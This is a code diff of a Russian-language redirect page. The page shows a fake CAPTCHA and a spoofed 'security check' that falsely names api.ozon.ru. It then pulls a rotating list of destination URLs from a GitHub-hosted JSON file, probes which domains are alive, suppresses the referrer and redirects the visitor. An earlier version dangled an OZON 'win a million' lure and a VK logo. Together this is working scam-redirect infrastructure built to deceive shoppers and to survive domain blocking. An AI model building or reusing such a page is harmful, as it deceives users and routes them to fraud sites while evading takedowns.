@@ -1,17 +1,14 @@
-<!DOCTYPE html> 
+<!DOCTYPE html>
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="referrer" content="same-origin">
+    <meta name="referrer" content="no-referrer">
     
     <title>© 2026 Защищенное перенаправление трафика</title>
-
-    <link rel="icon" type="image/png" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQWrxB8FZVbsRP4ro-7lVqQjY6vsuRBf1TbfBSz96mVNDx6Np6HqevUn6dW&s=10">
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="OZON.ru маркетплейс – миллионы товаров по выгодным...">
-    <meta name="twitter:description" content="🏆 Стань миллионером с Ozon! Делай любимые покупки, выполняй задания и участвуй в розыгрыше главного приза. Твой шанс забрать миллион — всего в одном клике! 💸">
-    <meta name="twitter:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQWrxB8FZVbsRP4ro-7lVqQjY6vsuRBf1TbfBSz96mVNDx6Np6HqevUn6dW&s=10">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Переход на официальный сайт партнера">
+    <meta property="og:description" content="Пожалуйста, подождите, идет проверка безопасности соединения...">
 
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
@@ -41,6 +38,7 @@
         .status-msg { font-size: 12px; color: #3498db; margin-top: 10px; font-weight: 500; }
         .footer-note { margin-top: 30px; padding-top: 20px; border-top: 1px solid #edf2f7; font-size: 12px; color: #95a5a6; }
 
+        /* СТИЛИ ДЛЯ ИМИТАЦИИ КАПЧИ */
         .captcha-box {
             display: none; 
             background: #f9f9f9;
@@ -54,14 +52,37 @@
             text-align: left;
             box-shadow: 0 2px 5px rgba(0,0,0,0.02);
         }
-        .captcha-left { display: flex; align-items: center; gap: 12px; }
-        .captcha-checkbox { width: 24px; height: 24px; cursor: pointer; accent-color: #3498db; }
-        .captcha-text { font-size: 14px; font-weight: 500; color: #333; user-select: none; cursor: pointer; }
-        .captcha-right { display: flex; flex-direction: column; align-items: center; font-size: 10px; color: #7f8c8d; }
+        .captcha-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .captcha-checkbox {
+            width: 24px;
+            height: 24px;
+            cursor: pointer;
+            accent-color: #3498db;
+        }
+        .captcha-text {
+            font-size: 14px;
+            font-weight: 500;
+            color: #333;
+            user-select: none;
+            cursor: pointer;
+        }
+        .captcha-right {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            font-size: 10px;
+            color: #7f8c8d;
+        }
         .captcha-icon {
-            width: 26px; height: 26px;
-            background: url('https://upload.wikimedia.org/wikipedia/commons/a/ad/RecaptchaAnchor.svg') no-repeat center;
-            background-size: contain; margin-bottom: 2px;
+            width: 26px;
+            height: 26px;
+            background: url('https://commons.wikimedia.org/wiki/File:ReCAPTCHA_icon.svg#/media/File:ReCAPTCHA_icon.svg') no-repeat center;
+            background-size: contain;
+            margin-bottom: 2px;
         }
     </style>
 </head>
@@ -69,7 +90,7 @@
 
     <div class="redirect-container">
         <div class="logo-area">
-            <img src="https://thumb.cloud.mail.ru/weblink/thumb/xw1/TfKk/QGyS93cW7/PNG%20-%20digital/VK%20Logo.png?mt=1684832836000" alt="Логотип" class="logo-img" onerror="this.style.display='none';">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSRFyiRXAQ9jFWyaBFXFTdV_IQCdtXx1FMdgddtrBU2lg&s=10" alt="Логотип" class="logo-img" onerror="this.style.display='none';">
         </div>
 
         <div class="loader-ring" id="loader"></div>
@@ -86,8 +107,8 @@
             </div>
         </div>
 
-        <h2 id="title">Загрузка...</h2>
-        <p id="desc">Пожалуйста, подождите, идет подготовка соединения.</p>
+        <h2 id="title">Проверка соединения...</h2>
+        <p id="desc">Пожалуйста, подождите, выполняется проверка безопасности соединения</p>
         <div id="status" class="status-msg"></div>
 
         <div class="footer-note">
@@ -97,85 +118,122 @@
     </div>
 
     <script>
-        // Относительный путь к файлу в том же каталоге
-        const LOCAL_JSON_URL = './urls.json';
-        
-        let targetUrl = null;
+        // Прямая ссылка на ваш JSON файл в репозитории
+        const GITHUB_JSON_URL = "https://raw.githubusercontent.com/vk-2captcha-proving-ground/opensec/main/urls.json";
 
-        // Пинг первого URL в фоне
+        // Функция случайного перемешивания массива (Алгоритм Фишера-Йетса)
+        function shuffleArray(array) {
+            for (let i = array.length - 1; i > 0; i--) {
+                const j = Math.floor(Math.random() * (i + 1));
+                [array[i], array[j]] = [array[j], array[i]];
+            }
+            return array;
+        }
+
+        // Функция проверки доступности ссылки
         async function checkUrlAccessible(url) {
             try {
-                const controller = new AbortController();
-                const timeoutId = setTimeout(() => controller.abort(), 2500);
-                await fetch(url, { mode: 'no-cors', cache: 'no-store', signal: controller.signal });
-                clearTimeout(timeoutId);
+                await fetch(url, { mode: 'no-cors', cache: 'no-store', timeout: 3000 });
                 return true; 
             } catch (error) {
                 return false; 
             }
         }
 
-        // Подготовка ссылки сразу при заходе на страницу
-        async function prepareTargetUrl() {
-            try {
-                const response = await fetch(LOCAL_JSON_URL, { cache: 'no-store' });
-                const urls = await response.json();
+        async function startRedirection() {
+            const titleEl = document.getElementById('title');
+            const descEl = document.getElementById('desc');
+            const statusEl = document.getElementById('status');
+            const loaderEl = document.getElementById('loader');
+            const captchaBoxEl = document.getElementById('captchaBox');
+            const captchaCheckEl = document.getElementById('captchaCheck');
 
-                if (Array.isArray(urls) && urls.length > 0) {
-                    const firstUrl = urls[0];
-                    const isAlive = await checkUrlAccessible(firstUrl);
-                    targetUrl = isAlive ? firstUrl : urls[0];
-                } else if (urls && urls.url) {
-                    // Поддержка формата {"url": "https://..."}
-                    const isAlive = await checkUrlAccessible(urls.url);
-                    targetUrl = isAlive ? urls.url : urls.url;
-                }
+            let targetUrls = [];
+
+            // 1. Скачиваем актуальный конфигурационный файл со ссылками из GitHub
+            try {
+                const response = await fetch(GITHUB_JSON_URL, { cache: 'no-store' });
+                targetUrls = await response.json();
             } catch (e) {
-                console.error("Ошибка загрузки urls.json:", e);
-            } finally {
-                // Показываем капчу пользователю
-                document.getElementById('loader').style.display = 'none';
-                document.getElementById('captchaBox').style.display = 'flex';
-                document.getElementById('title').innerText = "Подтвердите действие";
-                document.getElementById('desc').innerText = "Чтобы продолжить переход на сайт партнера, подтвердите, что вы не являетесь роботом.";
+                titleEl.innerText = "Ошибка соединения";
+                descEl.innerText = "Попробуйте подключиться позже или используйте средства восстановления подключения к сети Интернет.";
+                statusEl.innerText = "Ошибка: Сбой проверки соединения.";
+                statusEl.style.color = "#e74c3c";
+                if(loaderEl) loaderEl.style.display = 'none';
+                return;
             }
+
+            if (!targetUrls || targetUrls.length === 0) {
+                titleEl.innerText = "Технические работы";
+                descEl.innerText = "Пожалуйста, попробуйте через 15 минут.";
+                statusEl.innerText = "Ошибка: Нет данных.";
+                statusEl.style.color = "#e74c3c";
+                if(loaderEl) loaderEl.style.display = 'none';
+                return;
+            }
+
+            // 2. Перемешиваем ссылки случайным образом для равномерного распределения
+            targetUrls = shuffleArray(targetUrls);
+
+            // Скрываем начальную загрузку и показываем капчу
+            if(loaderEl) loaderEl.style.display = 'none';
+            captchaBoxEl.style.display = 'flex';
+            
+            titleEl.innerText = "Подтвердите действие";
+            descEl.innerText = "Чтобы продолжить переход на сайт партнера, подтвердите, что вы не являетесь роботом.";
+            statusEl.innerText = "";
+
+            // 3. Обработка прохождения капчи пользователем
+            captchaCheckEl.addEventListener('change', async function() {
+                if (this.checked) {
+                    captchaCheckEl.disabled = true;
+                    captchaBoxEl.style.display = 'none';
+                    if(loaderEl) loaderEl.style.display = 'inline-block';
+                    
+                    titleEl.innerText = "Проверка соединения...";
+                    descEl.innerText = "Пожалуйста, подождите, выполняется проверка безопасности соединения";
+                    
+                    let activeUrl = null;
+
+                    // Перебираем перемешанный массив
+                    for (let i = 0; i < targetUrls.length; i++) {
+                        const currentUrl = targetUrls[i];
+                        try {
+                            const domainName = new URL(currentUrl).hostname;
+                            statusEl.innerText = `Анализ шлюза: api.ozon.ru...`;
+                            
+                            const isAlive = await checkUrlAccessible(currentUrl);
+                            if (isAlive) {
+                                activeUrl = currentUrl;
+                                break; // Нашли первый живой случайный домен — останавливаем цикл
+                            }
+                        } catch(urlErr) {
+                            continue;
+                        }
+                    }
+
+                    // 4. Финальный редирект
+                    if (activeUrl) {
+                        titleEl.innerText = "Соединение установлено";
+                        descEl.innerHTML = `Вы перенаправляетесь на сайт партнера.<br>Это займет не более 3 секунд.`;
+                        statusEl.innerText = `Статус: Безопасное подключение`;
+                        statusEl.style.color = "#2ecc71";
+
+                        setTimeout(() => {
+                            window.location.replace(activeUrl);
+                        }, 3000);
+                    } else {
+                        titleEl.innerText = "Технические работы";
+                        descEl.innerText = "К сожалению, все серверы в данный момент перегружены или недоступны. Пожалуйста, попробуйте через 15 минут";
+                        statusEl.innerText = "Ошибка: Нет доступных шлюзов.";
+                        statusEl.style.color = "#e74c3c";
+                        if(loaderEl) loaderEl.style.display = 'none';
+                    }
+                }
+            });
         }
 
-        // Обработка клика по чекбоксу
-        document.getElementById('captchaCheck').addEventListener('change', function() {
-            if (this.checked) {
-                this.disabled = true;
-                document.getElementById('captchaBox').style.display = 'none';
-                document.getElementById('loader').style.display = 'inline-block';
-                
-                // Текст при клике
-                document.getElementById('title').innerText = "Проверка соединения";
-                document.getElementById('desc').innerText = "Пожалуйста, подождите. Идет безопасное перенаправление.";
-                document.getElementById('status').innerText = "Статус: Установление сессии...";
-                document.getElementById('status').style.color = "#3498db";
-
-                // Переход ровно через 1 секунду
-                setTimeout(() => {
-                    if (targetUrl) {
-                        window.location.replace(targetUrl);
-                    } else {
-                        // Запасная попытка забрать адрес, если файл долго подгружался
-                        fetch(LOCAL_JSON_URL, { cache: 'no-store' })
-                            .then(res => res.json())
-                            .then(data => {
-                                const fallback = Array.isArray(data) ? data[0] : data.url;
-                                window.location.replace(fallback);
-                            })
-                            .catch(() => {
-                                window.location.reload();
-                            });
-                    }
-                }, 1000);
-            }
-        });
-
-        // Запуск при открытии страницы
-        window.onload = prepareTargetUrl;
+        window.onload = startRedirection;
     </script>
 </body>
 </html>
